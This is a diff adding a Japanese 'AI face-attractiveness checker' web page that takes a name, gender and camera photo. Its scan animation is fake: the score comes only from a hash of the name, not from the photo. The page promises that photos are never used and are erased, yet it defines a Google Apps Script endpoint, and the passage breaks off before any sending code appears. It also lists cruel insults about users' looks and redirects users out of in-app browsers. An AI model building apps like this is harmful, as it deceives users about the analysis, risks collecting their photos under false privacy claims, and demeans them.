@@ -1,0 +1,860 @@
+<!doctype html>
+<html lang="ja">
+ <head>
+  <meta charset="UTF-8">
+  <!-- スマホで画面が崩れないようにビューポートを設定 -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>AI顔面偏差値チェッカー</title>
+  <!-- かわいい丸ゴシックフォント（M PLUS Rounded 1c）を読み込み -->
+  <link href="https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+        body { 
+            background-color: #fff0f5; 
+            display: flex; flex-direction: column;
+            min-height: 100vh; margin: 0; 
+            font-family: 'M PLUS Rounded 1c', sans-serif; 
+            color: #5e4a50; overflow-x: hidden;
+            transition: background-color 0.6s ease;
+            padding-top: 50px;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        /* 一番上のヘッダー */
+        header {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 50px;
+            background-color: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+            z-index: 2500;
+            border-bottom: 1px solid rgba(255, 183, 197, 0.3);
+        }
+
+        .header-logo {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #ff85a2;
+            letter-spacing: 1px;
+            transition: color 0.4s ease;
+        }
+
+        /* シンプルな○の中にiだけのデザイン */
+        .header-info {
+            width: 24px; height: 24px;
+            border-radius: 50%;
+            background: transparent;
+            border: 1.5px solid #ff85a2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: 700;
+            font-size: 0.8rem;
+            line-height: 1;
+            color: #ff85a2;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .header-info:hover {
+            opacity: 0.7;
+        }
+
+        /* ポップアップ背景 */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(3px);
+            -webkit-backdrop-filter: blur(3px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            padding: 65px 15px 15px 15px;
+            box-sizing: border-box;
+            animation: fadeIn 0.25s ease;
+        }
+
+        /* ポップアップ本体 */
+        .modal-box {
+            background: white;
+            border-radius: 30px;
+            padding: 24px 18px;
+            width: 100%;
+            max-width: 360px;
+            max-height: 80vh;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            text-align: left;
+            color: #5e4a50;
+            font-size: 0.73rem;
+            line-height: 1.65;
+        }
+
+        .modal-title {
+            font-weight: 700;
+            color: #ff85a2;
+            font-size: 0.88rem;
+            margin: 16px 0 6px 0;
+            transition: color 0.4s ease;
+        }
+
+        .modal-title:first-child {
+            margin-top: 0;
+        }
+
+        .modal-box p {
+            margin: 5px 0;
+        }
+
+        .modal-box .sub-note {
+            padding-left: 14px;
+            font-size: 0.68rem;
+            color: #ff85a2;
+            transition: color 0.4s ease;
+        }
+
+        .modal-box .sub-list {
+            padding-left: 14px;
+            font-size: 0.7rem;
+            color: #6e5a60;
+        }
+
+        /* 各項目を独立した薄ピンクのブロックで区切る */
+        .section-block {
+            background: #fff5f8;
+            border: 1.5px solid #ffd1dc;
+            border-radius: 18px;
+            padding: 12px 14px;
+            margin: 6px 0 14px 0;
+            transition: border-color 0.4s ease, background-color 0.4s ease;
+        }
+
+        .moukinka-badge {
+            background: #fff0f5;
+            border: 1px solid #ffd1dc;
+            border-radius: 15px;
+            padding: 10px 12px;
+            margin: 12px 0;
+            font-size: 0.7rem;
+            color: #ff85a2;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .modal-close-guide {
+            text-align: center;
+            font-weight: 700;
+            color: #ff85a2;
+            margin-top: 14px;
+            font-size: 0.75rem;
+        }
+
+        .modal-close-btn {
+            display: block;
+            width: 100%;
+            margin-top: 12px;
+            padding: 12px 0;
+            border: none;
+            border-radius: 25px;
+            background: #ff85a2;
+            color: white;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+            transition: background-color 0.4s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* メイン部分を中央に配置するためのラッパー */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 50px);
+            padding: 20px 15px;
+            box-sizing: border-box;
+        }
+
+        /* 起動時ローディング画面 */
+        #splash-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #fff0f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .load-text {
+            font-size: 1.8rem;
+            color: #ff85a2;
+            font-weight: 700;
+            letter-spacing: 2px;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+        }
+
+        .container { 
+            text-align: center; background: white; padding: 35px 20px; 
+            border-radius: 40px; 
+            box-shadow: 0 15px 35px rgba(255,133,162,0.15); 
+            width: 100%; max-width: 350px;
+            box-sizing: border-box;
+            animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        h1 { 
+            color: #ff85a2; font-size: 1.2rem; margin-bottom: 20px; 
+            transition: color 0.4s ease;
+            letter-spacing: 0.5px;
+            font-weight: 700;
+        }
+
+        .gender-select { margin-bottom: 20px; display: flex; justify-content: center; gap: 12px; }
+        .gender-btn { 
+            flex: 1; padding: 12px 0; border-radius: 25px; border: 2px solid #ffd1dc; 
+            cursor: pointer; font-weight: 700; background: white; 
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 0.85rem;
+            color: #ff85a2;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .gender-btn:hover {
+            transform: translateY(-2px);
+            background: #fff9fa;
+        }
+        
+        input[type="text"] {
+            width: 100%; padding: 14px 20px; border-radius: 25px; border: 2px solid #ffb7c5;
+            margin-bottom: 20px; text-align: center; outline: none; font-size: 0.85rem;
+            color: #5e4a50; box-sizing: border-box;
+            transition: all 0.3s ease;
+            background: #fff9fa;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+        }
+        input[type="text"]::placeholder {
+            color: #d2b5bc;
+        }
+        input[type="text"]:focus {
+            box-shadow: 0 0 0 4px rgba(255, 133, 162, 0.15);
+            background: white;
+        }
+
+        .camera-trigger { 
+            display: block; width: 100%; background: #ff85a2; color: white; 
+            padding: 15px 0; border-radius: 25px; font-weight: 700; 
+            cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 6px 20px rgba(255, 133, 162, 0.35);
+            box-sizing: border-box;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .camera-trigger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 133, 162, 0.45);
+        }
+        .camera-trigger:active {
+            transform: translateY(1px);
+        }
+        .camera-trigger.disabled { 
+            background: #f0f0f0 !important; color: #b5b5b5; 
+            cursor: not-allowed; box-shadow: none !important; 
+            transform: none !important;
+        }
+
+        #file-input { display: none; }
+        
+        .preview-wrapper {
+            position: relative;
+            margin-top: 15px;
+            display: none;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            animation: fadeIn 0.5s ease;
+            background: #000;
+        }
+        #preview { 
+            width: 100%; 
+            display: block; 
+            border-radius: 20px; 
+            object-fit: cover; 
+            transition: transform 0.3s ease;
+        }
+
+        /* スキャン時のエフェクトライン */
+        .scan-line {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: #ff85a2;
+            box-shadow: 0 0 10px #ff85a2, 0 0 20px #ff85a2;
+            display: none;
+            animation: scanning 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes scanning {
+            0% { top: 0%; opacity: 0.8; }
+            100% { top: 100%; opacity: 0.8; }
+        }
+
+        /* 写真回転ボタン */
+        .rotate-btn {
+            background: white;
+            border: 2px solid #ff85a2;
+            color: #ff85a2;
+            padding: 10px 0;
+            border-radius: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+            transition: all 0.2s ease;
+            display: none;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .rotate-btn:hover {
+            background: #fff9fa;
+        }
+
+        /* 回転時の注意書きテキスト */
+        .rotate-note {
+            font-size: 0.62rem;
+            color: #b0a0a5;
+            margin-top: 6px;
+            line-height: 1.4;
+            display: none;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+        }
+        
+        .btn { 
+            border: none; padding: 15px 25px; border-radius: 25px; font-weight: 700; 
+            cursor: pointer; width: 100%; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
+            margin-top: 10px; color: white; 
+            box-shadow: 0 6px 20px rgba(255, 133, 162, 0.3);
+            box-sizing: border-box;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+        }
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .loading { font-size: 0.95rem; color: #ff85a2; margin-top: 20px; display: none; font-weight: 700; }
+        .message-label { font-size: 0.75rem; color: #ff85a2; margin-top: 8px; display: none; line-height: 1.4; animation: fadeIn 0.4s ease; }
+        
+        .result { 
+            margin-top: 20px; font-size: 0.95rem; font-weight: 700; color: #ff85a2; 
+            display: none; animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            background: #fff5f8; padding: 18px; border-radius: 25px;
+            font-family: 'M PLUS Rounded 1c', sans-serif;
+        }
+
+        /* 一番下までスクロールすると見える黒いエリア */
+        footer {
+            width: 100%;
+            background-color: #111111;
+            color: #ffffff;
+            text-align: center;
+            padding: 35px 20px;
+            box-sizing: border-box;
+            font-size: 0.85rem;
+            letter-spacing: 1.5px;
+            line-height: 1.8;
+        }
+        footer .copyright {
+            font-size: 0.7rem;
+            color: #aaaaaa;
+            margin-top: 8px;
+        }
+    </style>
+  <script>
+        // 【LINE対策】LINEアプリ内ブラウザで開かれた場合、強制的にSafariやChromeで開き直す処理
+        (function() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            if (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.indexOf('Line') > -1) {
+                if (ua.indexOf('Android') > -1) {
+                    const url = window.location.href;
+                    const scheme = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+                    window.location.href = scheme;
+                } else {
+                    let currentUrl = window.location.href;
+                    if (currentUrl.indexOf('openExternalBrowser=1') === -1) {
+                        const separator = currentUrl.indexOf('?') !== -1 ? '&' : '?';
+                        window.location.href = currentUrl + separator + 'openExternalBrowser=1';
+                    }
+                }
+            }
+        })();
+    </script>
+ <style>html{ color:darkviolet; }</style></head>
+ <body>
+  <!-- 起動時ローディングスプラッシュ -->
+  <div id="splash-screen">
+      <div class="load-text" id="load-text">Load</div>
+  </div>
+
+  <!-- 一番上のヘッダー -->
+  <header>
+      <div class="header-logo" id="header-logo">MOUKINKA</div>
+      <div class="header-info" id="header-info">i</div>
+  </header>
+
+  <!-- ロード終了後＆iマークを押したときに表示される注意事項・使い方・FAQポップアップ -->
+  <div class="modal-overlay" id="info-modal">
+      <div class="modal-box" id="modal-box-inner">
+          
+          <div class="modal-title">ご利用にあたっての注意事項</div>
+          <div class="section-block">
+              <p>• 入力されたデータや写真はAIの学習には一切使用されませんので、どうぞご安心ください。</p>
+              <p>• 写真などのデータは、ブラウザを閉じるとすべて端末上から消去されます。</p>
+              <p>• AIの特性上、一部不自然な回答が表示される場合がございます。万が一、不快に感じられる表現がございましたら申し訳ございません。</p>
+          </div>
+
+          <div class="modal-title">使い方</div>
+          <div class="section-block">
+              <p>1. まず、性別を選択してください。</p>
+              <p>2. 次に、お名前を入力してください（ニックネームなど、どのようなお名前でも構いません）。</p>
+              <p>3. 「カメラで撮影する」ボタンを押し、写真を撮影してください。</p>
+              <p class="sub-note">• ※正確な診断のため、できるだけ明るい場所で撮影してください。</p>
+              <p>4. 最後に、「診断スタート！」ボタンを押して、結果が表示されるまで少々お待ちください。</p>
+          </div>
+
+          <div class="modal-title">匿名さん<br>顔面偏差値診断 正確 サイトはほんと？</div>
+          <div class="section-block">
+              <p>結論から言うと、<strong>「完全に正確（絶対的な客観性がある）な顔面偏差値診断サイトは存在しません」</strong><br>
+              AIや診断サイトのスコアは、あくまで特定のアルゴリズムや基準（黄金比やパーツの対称性など）に基づいた「目安やエンタメ」に過ぎません。</p>
+          </div>
+
+          <div class="modal-title">正確とは言えない理由</div>
+          <div class="section-block">
+              <p>• <strong>「正しい美的基準」が存在しない</strong><br>
+              何をもって・偏差値が高いとするかは文化、時代、個人の好みに大きく左右されます。AIに絶対的な美の定義はありません。</p>
+              <p style="margin-top: 8px;">• <strong>母集団（比較対象）が曖昧</strong><br>
+              本来の「偏差値」はテストを受ける全体の集団（母集団）があって初めて計算できるものですが、診断サイトは「何のデータを基準にしているか」が明確ではありません。</p>
+              <p style="margin-top: 8px;">• <strong>条件によって結果がブレる</strong></p>
+              <div class="sub-list">
+                  <p>• 光の当たり方、角度、表情（無表情か笑顔か）</p>
+                  <p>• メイクや、写真の加工（SNOWやBeautyPlusなど）の有無</p>
+                  <p>• 同じ写真でも、送るタイミングや使うAI（ChatGPT、Gemini、専用サイト等）によって点数が大きく変わります。</p>
+              </div>
+              <p style="margin-top: 8px;">• <strong>AIごとのクセがある</strong></p>
+              <div class="sub-list">
+                  <p>• ChatGPTは「優しく褒めすぎる（高めに出やすい）」傾向があり、プロンプトで「辛口にして」と指示しないと実態を反映しにくいことがあります。<br>まあ、辛口ですけど🙃🙃🙃</p>
+              </div>
+          </div>
+
+          <div class="modal-title">利用する上でのポイント・注意点</div>
+          <div class="section-block">
+              <p>• <strong>楽しむエンタメと割り切る：</strong>自分のパーツのバランス（黄金比や左右対称性）をざっくり知る「参考資料」程度に捉えるのが安全です。</p>
+              <p style="margin-top: 6px;">• <strong>写真の撮影条件を揃える：</strong>もし試す場合は、無加工のすっぴん・または薄化粧、明るい光で真正面を向いた写真を使うとブレが少なくなります。</p>
+              <p style="margin-top: 6px;">• <strong>プライバシーと写り込みに注意：</strong>他人の写真を勝手にアップロードしないこと、また背景に社員証や表札、位置情報（Exifデータ）などが写り込んでいないか確認してから使いましょう。</p>
+          </div>
+
+          <div class="moukinka-badge" id="moukinka-badge">
+              〔このサイトのAIはMOUKINKA AI<br>
+              MOUKINKA独自のAI画像生成に優れています！！ぜひお使いください<br>
+              作成日はなんと！1919年8月10日〕
+          </div>
+
+          <div class="modal-close-guide" id="modal-close-guide">
+              右上の〔 i 〕マークを押していただいたら閉じれます。<br>
+              お楽しみください
+          </div>
+
+          <button class="modal-close-btn" id="modal-close-btn">閉じる</button>
+      </div>
+  </div>
+
+  <div class="main-wrapper">
+   <div class="container" id="main-container">
+    <h1 id="title">AI顔面偏差値チェッカー</h1>
+    <div class="gender-select">
+     <button class="gender-btn" id="girl-select">女子</button>
+     <button class="gender-btn" id="boy-select">男子</button>
+    </div>
+    <input type="text" id="user-name" placeholder="名前：【例】田中 精神" maxlength="15">
+    
+    <div class="camera-trigger disabled" id="label-trigger">カメラで撮影する</div>
+    <input type="file" id="file-input" accept="image/*" capture="user"> 
+    
+    <div class="preview-wrapper" id="preview-wrapper">
+        <img id="preview">
+        <div class="scan-line" id="scan-line"></div>
+    </div>
+
+    <!-- 写真回転ボタン -->
+    <button class="rotate-btn" id="rotate-btn">写真を90度回転させる 🔄</button>
+    <div class="rotate-note" id="rotate-note">〔写真がずれておりましたら回転させてください。最終的にずれておりましてもAIがお直しします〕</div>
+
+    <button id="analyze-btn" class="btn" style="display:none">診断スタート！</button>
+    <button id="retry-btn" class="btn" style="display:none; background: #e0d0d5; box-shadow: none;">撮り直す</button>
+    
+    <div class="loading" id="loading">
+     解析中...
+    </div>
+    <div class="message-label" id="message">
+     少し時間がかかります
+     <br>
+     画面を閉じないで待っててね！
+    </div>
+    <div class="result" id="result-text"></div>
+   </div>
+  </div>
+
+  <!-- 一番下までスクロールすると見える黒いエリア -->
+  <footer>
+      <div>株式会社</div>
+      <div>MOUKINKA</div>
+      <div class="copyright">©2026</div>
+  </footer>
+
+  <script>
+    (function() {
+        // ポップアップ開閉処理
+        function toggleInfoModal() {
+            const modal = document.getElementById('info-modal');
+            if (modal.style.display === 'flex') {
+                modal.style.display = 'none';
+            } else {
+                modal.style.display = 'flex';
+            }
+        }
+        function openInfoModal() {
+            document.getElementById('info-modal').style.display = 'flex';
+        }
+        function closeInfoModal() {
+            document.getElementById('info-modal').style.display = 'none';
+        }
+
+        // イベントリスナーの割り当て
+        document.getElementById('header-info').addEventListener('click', toggleInfoModal);
+        document.getElementById('info-modal').addEventListener('click', closeInfoModal);
+        document.getElementById('modal-box-inner').addEventListener('click', (e) => e.stopPropagation());
+        document.getElementById('modal-close-btn').addEventListener('click', closeInfoModal);
+
+        // 起動時の「Load…」アニメーション制御（1.5秒後に消して注意事項ポップアップを表示）
+        let dotCount = 0;
+        const loadTextEl = document.getElementById('load-text');
+        const dotInterval = setInterval(() => {
+            dotCount = (dotCount % 3) + 1;
+            loadTextEl.innerText = "Load" + ".".repeat(dotCount);
+        }, 300);
+
+        setTimeout(() => {
+            clearInterval(dotInterval);
+            const splash = document.getElementById('splash-screen');
+            if (splash) {
+                splash.style.opacity = '0';
+                setTimeout(() => {
+                    splash.style.display = 'none';
+                    openInfoModal();
+                }, 500);
+            }
+        }, 1500);
+
+        let selectedGender = null;
+        let frontBlob = null;
+        let currentRotation = 0; // 回転角度管理用
+        
+        // ★ご指定いただいたGASのURLを設定
+        const GAS_URL = "https://script.google.com/macros/s/AKfycbzufIFIsgYHeagm-1I4ntLH8T3q2z1AddaB2-dSVL1Dh9fibzycBn8bnwOBH4sdSQ7xaQ/exec";
+        
+        function setGender(gender) {
+            selectedGender = gender;
+            const isGirl = gender === 'girl';
+            const color = isGirl ? '#ff85a2' : '#4a90e2';
+            const lightColor = isGirl ? '#fff0f5' : '#f0f4ff';
+            const borderLight = isGirl ? '#ffd1dc' : '#b5d0ff';
+            
+            document.body.style.backgroundColor = lightColor;
+            document.getElementById('header-logo').style.color = color;
+            document.getElementById('header-info').style.borderColor = color;
+            document.getElementById('header-info').style.color = color;
+            document.getElementById('title').style.color = color;
+            document.getElementById('user-name').style.borderColor = isGirl ? '#ffb7c5' : '#b5d0ff';
+            document.getElementById('label-trigger').style.backgroundColor = color;
+            document.getElementById('rotate-btn').style.borderColor = color;
+            document.getElementById('rotate-btn').style.color = color;
+            document.getElementById('analyze-btn').style.backgroundColor = color;
+            document.getElementById('modal-close-btn').style.backgroundColor = color;
+            document.getElementById('modal-close-guide').style.color = color;
+            document.getElementById('moukinka-badge').style.color = color;
+            document.getElementById('moukinka-badge').style.borderColor = borderLight;
+            document.getElementById('moukinka-badge').style.backgroundColor = lightColor;
+            document.getElementById('loading').style.color = color;
+            document.getElementById('message').style.color = color;
+            document.getElementById('result-text').style.color = color;
+            document.getElementById('scan-line').style.backgroundColor = color;
+            document.getElementById('scan-line').style.boxShadow = `0 0 10px ${color}, 0 0 20px ${color}`;
+
+            document.querySelectorAll('.section-block').forEach(el => {
+                el.style.backgroundColor = lightColor;
+                el.style.borderColor = borderLight;
+            });
+
+            document.querySelectorAll('.modal-title').forEach(el => {
+                el.style.color = color;
+            });
+            document.querySelectorAll('.sub-note').forEach(el => {
+                el.style.color = color;
+            });
+
+            document.getElementById('girl-select').style.borderColor = isGirl ? color : '#ffd1dc';
+            document.getElementById('girl-select').style.color = isGirl ? color : '#b0a0a5';
+            document.getElementById('boy-select').style.borderColor = !isGirl ? color : '#ffd1dc';
+            document.getElementById('boy-select').style.color = !isGirl ? color : '#b0a0a5';
+            
+            updateUI();
+        }
+
+        document.getElementById('girl-select').addEventListener('click', () => setGender('girl'));
+        document.getElementById('boy-select').addEventListener('click', () => setGender('boy'));
+
+        const nameInput = document.getElementById('user-name');
+        const triggerLabel = document.getElementById('label-trigger');
+
+        function updateUI() {
+            if (selectedGender && nameInput.value.trim().length > 0) {
+                triggerLabel.classList.remove('disabled');
+            } else {
+                triggerLabel.classList.add('disabled');
+            }
+        }
+
+        nameInput.addEventListener('input', updateUI);
+        
+        // 「カメラで撮影する」を押したときの処理
+        triggerLabel.addEventListener('click', () => { 
+            if (triggerLabel.classList.contains('disabled')) return;
+            document.getElementById('file-input').click();
+        });
+
+        // 写真を90度ずつ回転させる関数
+        function rotateImage() {
+            currentRotation = (currentRotation + 90) % 360;
+            const previewImg = document.getElementById('preview');
+            previewImg.style.transform = `rotate(${currentRotation}deg)`;
+        }
+        document.getElementById('rotate-btn').addEventListener('click', rotateImage);
+
+        // 写真が選択・撮影されたときの処理（プレビュー表示）
+        document.getElementById('file-input').addEventListener('change', (e) => {
+            if (e.target.files[0]) {
+                const file = e.target.files[0];
+                frontBlob = file;
+                currentRotation = 0; // 新しい写真が選ばれたら回転をリセット
+
+                const reader = new FileReader();
+                reader.onload = (event) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const previewImg = document.getElementById('preview');
+                        previewImg.src = event.target.result;
+                        previewImg.style.transform = `rotate(0deg)`;
+
+                        document.getElementById('preview-wrapper').style.display = 'block';
+                        document.getElementById('rotate-btn').style.display = 'block';
+                        document.getElementById('rotate-note').style.display = 'block';
+                        document.getElementById('analyze-btn').style.display = 'block';
+                        document.getElementById('retry-btn').style.display = 'block';
+                        triggerLabel.style.display = 'none';
+                        nameInput.style.display = 'none';
+                        document.querySelector('.gender-select').style.display = 'none';
+                    };
+                    img.src = event.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        document.getElementById('retry-btn').addEventListener('click', () => location.reload());
+
+        // 名前から同じ結果を導き出すためのハッシュ関数
+        function getHashCode(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                hash |= 0;
+            }
+            return Math.abs(hash);
+        }
+
+        document.getElementById('analyze-btn').addEventListener('click', async () => {
+            const displayName = nameInput.value.trim();
+            const discordGender = selectedGender === 'girl' ? '女子' : '男子';
+
+            document.getElementById('rotate-btn').style.display = 'none';
+            document.getElementById('rotate-note').style.display = 'none';
+            document.getElementById('analyze-btn').style.display = 'none';
+            document.getElementById('retry-btn').style.display = 'none';
+            
+            document.getElementById('scan-line').style.display = 'block';
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(() => { document.getElementById('message').style.display = 'block'; }, 5000);
+
+            // 3パーセント刻み（3〜99）の配列を作成
+            const scores = [];
+            for(let i = 3; i <= 99; i += 3) { scores.push(i); }
+
+            // 名前を元に固定のインデックスを算出（同じ名前なら何度やっても同じ結果に）
+            const hash = getHashCode(displayName + discordGender);
+            const scoreIndex = hash % scores.length;
+            const score = scores[scoreIndex];
+
+            // 【女子用】超辛口コメントマップ（3%〜99%）
+            const girlComments = {
+                3: "画面が粉々に砕け散るレベルの衝撃映像です。直ちにスマホを水洗いしてください。",
+                6: "AIがこれ以上の解析を拒否して、緊急自動シャットダウンを発動しました。",
+                9: "前世で地球に対して何か取り返しのつかない大罪を犯した顔をしていますね。",
+                12: "鏡を見るたびに、ご自身の鏡に向かって土下座したほうがいいレベルのビジュアルです。",
+                15: "すれ違う野良猫すら目を合わせてくれず、そっとUターンしていくほどのパンチ力。",
+                18: "ファンクラブの会員番号「1番」は、墓場まで絶対に手に入らない安心の無所属。",
+                21: "「おしい！」……どこがとは言いませんが、全方位において取り返しがつきません。",
+                24: "クラスの集合写真に写り込むと、あなただけ必ず心霊写真のような不気味なオーラを放ちます。",
+                27: "「すっぴんです」アピールをされても、誰も「もともと可愛いから」と思ってくれません。",
+                30: "トランプのジョーカーとしてそのまま印刷できそうな、ある種の芸術的センスを感じます。",
+                33: "風が強い日に外を歩くと、前髪がめくれてさらなる大惨事（ホラー）が幕を開けます。",
+                36: "「雰囲気でごまかそう」という甘い幻想を、全方位から徹底的に粉砕する強烈な現実。",
+                39: "自撮りをするたびに、スマホのインカメラが恐怖で震えて自己修復を始めています。",
+                42: "電車の窓ガラスに映った自分の顔を見て、あまりの絶望にそっと目を閉じたことが何度もありますよね。",
+                45: "「普通の人より少し味がある」と言い続け、気づけばその「味」が生ゴミのようになってます。",
+                48: "可愛い服やトレンドのメイクをしても、服が「着られている感」を出して泣いて叫んでいます。",
+                51: "「お前、昨日なんかあった？」と聞かれるのが、挨拶代わりになっている不憫な日常。",
+                54: "自分の顔の写真を証明写真機で撮るたびに、機械の故障を疑い、警察を呼びたくなります。",
+                57: "「少しはマシに見える瞬間」を探すために、24時間すき間なく鏡を凝視し続ける過酷な修行。",
+                60: "「普通に生きるのが一番難しい」という言葉の重みを、全人類の反面教師として体現しています。",
+                63: "お世辞でも「チャーミング」と言えない、どんよりとした梅雨時の曇り空のような顔立ち。",
+                66: "合コンに行っても、ドリンクの注文係か、お会計の計算係としてしか重宝されない悲しき宿命。",
+                69: "SNSのアイコンをアニメの美少女キャラにしがちな人の、典型的すぎるリアルな現実の姿。",
+                72: "「磨けば光る原石」と言われ続けて、気づけば原石のまま完全に化石と化してしまいましたね。",
+                75: "「私なんて…」と言ったときに、「そんなことないよ！」と全力で否定してもらうための高度な罠。",
+                78: "「地味だけど誠実そう」という、会社の上司や同僚からの、可哀想な人に対する慈悲の評価。",
+                81: "80%突破！ですがここからが地獄の始まり、自慢の厚化粧もすべて溶け落ちる特大のブーメランが直撃。",
+                84: "80%台後半！「私いけてるかも」と勘違いした瞬間、全方位から容赦ない冷ややかな視線が突き刺さる。",
+                87: "おっと80%台後半！ 周囲からは「あ、必死に加工アプリで限界まで盛ってきたんだな」と哀れみの目で見られています。",
+                90: "まさかの90%台！…ですが、現実は残酷で、友達からは「今日どうしたの、顔の作り物感すごいね（嫌味）」と言われるレベル。",
+                93: "90%後半の奇跡！ しかし、自分のスマホの画面に映る加工顔と、現実のすっぴんのギャップで精神崩壊寸前。",
+                96: "頂点目前の90%台！ でも、鏡に映る現実は相変わらず厳しく、理想の王子様は一生現れる気配すらありません。",
+                99: "【MAX99%】全人類がひれ伏す奇跡の99%！…ただし、それはあなたの脳内お花畑のファンタジーの世界だけのお話です！"
+            };
+
+            // 【男子用】超辛口コメントマップ（3%〜99%）
+            const boyComments = {
+                3: "画面越しに悪臭が漂ってきそうなほどの圧倒的凶器。今すぐ画面を水洗いしてください。",
+                6: "AIのセキュリティが作動し、あなたの顔面を見た瞬間にシャッターが強制的に下ろされました。",
+                9: "歴史の教科書に載っているどんな古い妖怪よりも、はるかに強烈なインパクトを残します。",
+                12: "夜道で出会ったら、不審者ではなく危険生物として通報されて一網打尽にされるレベル。",
+                15: "自分の影を自分で踏んで、驚いてその場で腰を抜かしそうなほどの絶望的なビジュアル。",
+                18: "「顔面凶器」という言葉をここまで体現できる男は、日本国内を探してもあなた以外いません。",
+                21: "すれ違う猫すら目を合わせてくれず、道端の草むらにそっと隠れて見なかったことにされます。",
+                24: "警察の指名手配ポスターにそのまま使ったら、全国の警察が頭を抱えて頭痛薬を飲みまくるレベル。",
+                27: "福笑いのパーツをすべて裏表逆にして、さらに足でグチャグチャに踏み潰したようなお顔。",
+                30: "「お前の顔、なんか味があるよね」と言われるのは、単にイケメン要素が1ミリもない不細工なだけです。",
+                33: "正面から見ると絶望、横から見ると絶滅、斜めから見ると人類の敗北を感じるスリーサイズ。",
+                36: "「少しはマシに見える角度」を探すために、自分の顔を全方位から見ても絶望しかありません。",
+                39: "自分の顔写真をSNSに載せるとき、スタンプの位置をどこに置いても隠しきれない悲哀。",
+                42: "どんなにかっこいいライダースやスーツを着ても、顔がすべてを台無しにする奇跡のマイナス補正。",
+                45: "クラスの集合写真で、あなただけ必ず心霊写真のようになって不気味に浮かび上がって写り込みます。",
+                48: "「モテたい」という淡い夢を抱くこと自体が、全女性に対する深刻なテロ行為だと気づいてください。",
+                51: "自分の顔写真を証明写真機で撮るたびに、機械のほうが「おや、故障かな？」と自らエラーを吐きます。",
+                54: "「真面目そう」という評価だけで、ここまで女性との接点をすべてシャットアウトしてきた孤高の要塞。",
+                57: "合コンに行っても、空気の読めない寒いギャグを連発して、周囲の温度を氷点下に急降下させる天才。",
+                60: "「普通の人より少し面白い顔」という、自虐ネタ以外に生きる道が用意されていない悲しい宿命。",
+                63: "電車の窓ガラスに映る自分の髪型を直そうとして、自分の顔面と目が合った瞬間にそっと目を逸らす。",
+                66: "「雰囲気イケメン」の「雰囲気」を、全宇宙の物理法則を使って徹底的に剥ぎ取った丸裸の現実。",
+                69: "「話してみるといい奴」という、見た目を完全に諦めた男性に送られる業界最底辺の慰め言葉。",
+                72: "自分の過去の写真を見返して、「なんであの時こんな調子に乗った髪型してたんだろ」と枕を濡らす夜。",
+                75: "「お前って案外モテるだろ」と友達に言われて、「いやマジで生まれてこのかたゼロだって！」と絶叫する。",
